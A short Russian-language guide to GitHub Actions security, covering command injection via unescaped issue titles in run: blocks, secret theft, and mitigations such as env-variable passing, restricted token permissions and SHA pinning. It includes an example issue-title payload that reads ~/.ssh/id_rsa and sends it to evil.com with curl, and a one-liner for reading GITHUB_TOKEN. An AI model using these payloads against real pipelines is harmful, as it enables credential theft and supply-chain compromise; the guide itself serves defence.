# Безопасность GitHub Actions

## Введение

CI/CD пайплайны (конвейеры сборки) — это лакомый кусок для атакующих. Если злоумышленник получает возможность выполнить свой код в пайплайне, он может украсть секреты (токены, пароли) или изменить артефакты сборки (внедрить бэкдор в приложение).

## Инъекция команд (Command Injection)

Очень частая уязвимость в GitHub Actions: использование пользовательского ввода (например, названия issue или комментария) в `run:` блоках без экранирования.

Пример уязвимого кода:

```yaml
- name: Greet user
  run: echo "Hello ${{ github.event.issue.title }}"
```

Если злоумышленник создаст issue с названием `"; curl http://evil.com/$(cat ~/.ssh/id_rsa) #"`, его команда выполнится на сервере.

## Кража секретов

Секреты (Secrets) в GitHub Actions хранятся в переменных окружения. Если злоумышленник может управлять выполнением кода в workflow, он может их прочитать:

```bash
env | grep GITHUB_TOKEN
```

## Защита

1. Никогда не используйте `${{ github.event.* }}` внутри `run:`.
2. Передавайте данные через `env:` и используйте `$VAR` в bash.
3. Ограничивайте права `GITHUB_TOKEN` (используйте `permissions: read-all`).
4. Используйте пиннинг сторонних Actions по SHA-хэшу (а не по тегу `@v2`).
